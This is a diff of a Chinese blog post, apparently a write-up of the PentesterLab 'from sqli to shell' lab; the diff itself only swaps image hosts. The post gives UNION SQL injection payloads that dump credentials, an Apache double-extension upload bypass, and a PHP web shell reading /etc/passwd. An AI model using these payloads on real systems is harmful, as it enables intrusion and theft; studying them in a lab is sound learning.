@@ -23,16 +23,16 @@
 <meta property="og:url" content="http://heartsky.info/2016/08/02/from-sqli-to-shell/index.html">
 <meta property="og:site_name" content="HeartSky&#39;s blog">
 <meta property="og:description" content="无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了 探测信息打开是这样的先F12查看一下，获得了以下信息12服务端语言 PHP/5.3.3-7+squeeze14服务器     Apache/2.2.16 (Debian) 这里说一下，squeeze是Debi">
-<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image1.png">
-<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image2.png">
-<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image3.png">
-<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image4.png">
-<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image5.png">
-<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta property="og:image" content="http://heartsky.info/image/from_sqli_to_shell/image1.png">
+<meta property="og:image" content="http://heartsky.info/image/from_sqli_to_shell/image2.png">
+<meta property="og:image" content="http://heartsky.info/image/from_sqli_to_shell/image3.png">
+<meta property="og:image" content="http://heartsky.info/image/from_sqli_to_shell/image4.png">
+<meta property="og:image" content="http://heartsky.info/image/from_sqli_to_shell/image5.png">
+<meta property="og:updated_time" content="2018-10-26T06:06:01.497Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="from sqli to shell | HeartSky&#39;s blog">
 <meta name="twitter:description" content="无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了 探测信息打开是这样的先F12查看一下，获得了以下信息12服务端语言 PHP/5.3.3-7+squeeze14服务器     Apache/2.2.16 (Debian) 这里说一下，squeeze是Debi">
-<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image1.png">
+<meta name="twitter:image" content="http://heartsky.info/image/from_sqli_to_shell/image1.png">
     
     
     
@@ -191,7 +191,7 @@ classes that you can use:
 
   <section id="post-content" class="article-content post">
     <p>无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了</p>
-<h2 id="探测信息"><a href="#探测信息" class="headerlink" title="探测信息"></a>探测信息</h2><p>打开是这样的<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image1.png" alt=""><br>先F12查看一下，获得了以下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端语言 PHP/5.3.3-7+squeeze14</span><br><span class="line">服务器     Apache/2.2.16 (Debian)</span><br></pre></td></tr></table></figure></p>
+<h2 id="探测信息"><a href="#探测信息" class="headerlink" title="探测信息"></a>探测信息</h2><p>打开是这样的<br><img src="http://heartsky.info/image/from_sqli_to_shell/image1.png" alt=""><br>先F12查看一下，获得了以下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端语言 PHP/5.3.3-7+squeeze14</span><br><span class="line">服务器     Apache/2.2.16 (Debian)</span><br></pre></td></tr></table></figure></p>
 <p>这里说一下，squeeze是Debian 6.0稳定版(已经被淘汰)的开发代号，后面的MySQL版本也会出现它<br>然后我们再随便点几个按钮发现存在GET请求<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1</span><br></pre></td></tr></table></figure></p>
 <p>每一个id对应一张图片，注入单引号后，错误直接爆出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p>
 <p>这里肯定存在SQL注入了，同时确定了数据库语言为<code>MySQL</code></p>
@@ -203,14 +203,14 @@ classes that you can use:
 <h3 id="爆数据库、MySQL版本、当前用户"><a href="#爆数据库、MySQL版本、当前用户" class="headerlink" title="爆数据库、MySQL版本、当前用户"></a>爆数据库、MySQL版本、当前用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,database(),3,4</span><br><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,@@version,3,4</span><br><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,current_user,3,4</span><br></pre></td></tr></table></figure>
 <p>获得的数据如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">photoblog</span><br><span class="line">5.1.63-0+squeeze1</span><br><span class="line">pentesterlab@localhost</span><br></pre></td></tr></table></figure></p>
 <h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image2.png" alt=""><br>没多想直接锁定目标为users表</p>
+<p><img src="http://heartsky.info/image/from_sqli_to_shell/image2.png" alt=""><br>没多想直接锁定目标为users表</p>
 <h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image3.png" alt=""><br>有三列，这里用concat()将用户名和密码连接起来，就不用查询两次了</p>
+<p><img src="http://heartsky.info/image/from_sqli_to_shell/image3.png" alt=""><br>有三列，这里用concat()将用户名和密码连接起来，就不用查询两次了</p>
 <h3 id="爆登录用户名、密码"><a href="#爆登录用户名、密码" class="headerlink" title="爆登录用户名、密码"></a>爆登录用户名、密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,concat(login,&apos;:&apos;,password),3,4 from photoblog.users</span><br></pre></td></tr></table></figure>
-<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image4.png" alt=""><br>密码看起来像是md5，找个解密网站解密后得到P4ssw0rd，然后就可以用它登录后台页面了</p>
+<p><img src="http://heartsky.info/image/from_sqli_to_shell/image4.png" alt=""><br>密码看起来像是md5，找个解密网站解密后得到P4ssw0rd，然后就可以用它登录后台页面了</p>
 <hr>
 <h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>登录后有个上传图片的功能，猜测可能有文件上传漏洞，写个测试文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>文件后缀为.php，上传后提示NO PHP!!，应该是用了黑名单策略，因为服务器是Apache，所以我们可以利用Apache解析文件后缀时遇到不认识的会丢弃并往前找的特性，把文件后缀改为.php.jk，这样验证时文件后缀被认为是.jk，但打开文件时会被解析为.php。成功绕过，后来看了下官方题解，改为.php3也可以<br>F12找到图片路径<code>admin/uploads/123.php.jk</code><br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image5.png" alt=""><br>可以看到文件里的代码被成功执行了<br>接下来只要利用system()函数就可以执行操作系统命令了，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">'uname;'</span>);</span><br><span class="line">    system(<span class="string">'cat /etc/passwd;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>文件后缀为.php，上传后提示NO PHP!!，应该是用了黑名单策略，因为服务器是Apache，所以我们可以利用Apache解析文件后缀时遇到不认识的会丢弃并往前找的特性，把文件后缀改为.php.jk，这样验证时文件后缀被认为是.jk，但打开文件时会被解析为.php。成功绕过，后来看了下官方题解，改为.php3也可以<br>F12找到图片路径<code>admin/uploads/123.php.jk</code><br><img src="http://heartsky.info/image/from_sqli_to_shell/image5.png" alt=""><br>可以看到文件里的代码被成功执行了<br>接下来只要利用system()函数就可以执行操作系统命令了，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">'uname;'</span>);</span><br><span class="line">    system(<span class="string">'cat /etc/passwd;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>总的来说，这个镜像很简单，基本上没有过滤，只是作为给你提供一个从SQL注入到OS命令执行的一般思路吧，正如镜像名 from sqli to shell, 初学者可以试下</p>
 
   </section>
